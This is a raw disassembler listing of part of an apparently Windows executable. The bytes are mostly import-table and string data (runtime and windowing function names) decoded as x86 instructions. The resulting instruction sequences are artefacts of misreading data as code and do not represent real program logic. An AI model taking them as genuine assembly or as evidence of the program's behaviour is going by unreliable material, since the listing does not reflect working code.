  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
